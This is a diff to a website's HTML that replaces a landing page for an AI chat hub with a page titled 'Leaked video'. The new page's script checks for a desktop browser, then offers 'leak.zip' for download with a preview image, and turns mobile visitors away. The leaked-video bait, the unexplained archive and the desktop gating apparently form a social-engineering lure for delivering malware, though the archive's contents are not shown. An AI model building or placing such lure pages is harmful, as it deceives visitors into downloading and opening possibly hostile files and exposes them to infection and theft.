@@ -1,43 +1,66 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nkomode GPT – Free AI Hub (LLaMA, DeepSeek R1 & GPT-5)</title>
-  <meta name="description" content="Nkomode GPT is your free AI hub. Chat with Meta LLaMA, DeepSeek R1, and GPT-5 in one place – fast, free, and simple.">
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Leaked video</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--accent:#7dd3fc;--muted:#9aa6b2}
+    html,body{height:100%;margin:0;font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;background:linear-gradient(180deg,#071024 0%, #081428 100%);color:#e6eef6}
+    .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:32px}
+    .card{width:100%;max-width:880px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);box-shadow:0 10px 30px rgba(2,6,23,0.6);padding:28px;border-radius:12px;text-align:center}
+    h1{margin:8px 0 6px;font-size:22px}
+    p{color:var(--muted)}
+    img.preview{max-width:100%;border-radius:8px;margin-top:20px}
+  </style>
 </head>
-<body class="bg-gray-50 text-gray-800 font-sans">
+<body>
+  <div class="wrap">
+    <div class="card" id="card">
+      <h1 id="title">Checking your device...</h1>
+      <p id="message">Please wait while we verify if you're on a desktop device.</p>
+    </div>
+  </div>
 
-  <!-- Hero Section -->
-  <section class="flex flex-col justify-center items-center text-center min-h-screen bg-gradient-to-r from-blue-50 to-blue-100 px-6">
-    <h1 class="text-4xl md:text-5xl font-bold text-gray-900">
-      Your Free AI Hub – <span class="text-blue-600">Nkomode GPT</span>
-    </h1>
-    <p class="mt-4 text-lg md:text-xl text-gray-700 max-w-2xl">
-      Access <strong>Meta LLaMA</strong>, <strong>DeepSeek R1</strong>, and <strong>GPT-5</strong> all in one place.  
-      Fast, free, and simple.
-    </p>
-    <a href="https://nkomode.com/register" target="_blank" class="mt-8 inline-block bg-blue-600 text-white text-lg px-8 py-4 rounded-lg shadow hover:bg-blue-700 transition">
-      🚀 Try Nkomode GPT Free
-    </a>
-    <p class="mt-6 text-sm text-gray-500">sign-up and start chatting instantly. no monthly fees</p>
-  </section>
+  <script>
+    (function(){
+      const ua = navigator.userAgent || navigator.vendor || window.opera || '';
+      const width = Math.max(window.screen.width, window.innerWidth || 0);
+      const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+      const isMobileUA = mobileRegex.test(ua);
+      const isSmallScreen = width <= 900;
 
-  <!-- Footer -->
-  <footer class="bg-gray-100 py-6 text-center text-sm text-gray-500">
-    © 2025 Nkomode GPT. All rights reserved. 
-    <a href="/privacy.html" class="underline ml-2">Privacy Policy</a>
-  </footer>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-739388006">
-</script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+      const card = document.getElementById('card');
+      const title = document.getElementById('title');
+      const msg = document.getElementById('message');
 
-  gtag('config', 'AW-739388006');
-</script>
+      if(!isMobileUA && !isSmallScreen){
+        // Desktop detected — show preview and download link
+        title.textContent = 'Download Ready';
+        msg.innerHTML = 'Click below to download your file.';
+        const img = document.createElement('img');
+        img.src = '/preview.png'; // replace with your preview image path
+        img.alt = 'Preview of download';
+        img.className = 'preview';
+        const link = document.createElement('a');
+        link.href = '/leak.zip';
+        link.download = 'leak.zip';
+        link.textContent = 'Download leak.zip';
+        link.style.display = 'inline-block';
+        link.style.marginTop = '20px';
+        link.style.padding = '10px 16px';
+        link.style.background = 'var(--accent)';
+        link.style.color = '#000';
+        link.style.fontWeight = '600';
+        link.style.borderRadius = '6px';
+        card.appendChild(img);
+        card.appendChild(link);
+      } else {
+        // Mobile or tablet — block access
+        title.textContent = 'Desktop Required';
+        msg.innerHTML = 'This download is only available on desktop devices. Please revisit this page using a desktop browser to continue.';
+      }
+    })();
+  </script>
 </body>
 </html>
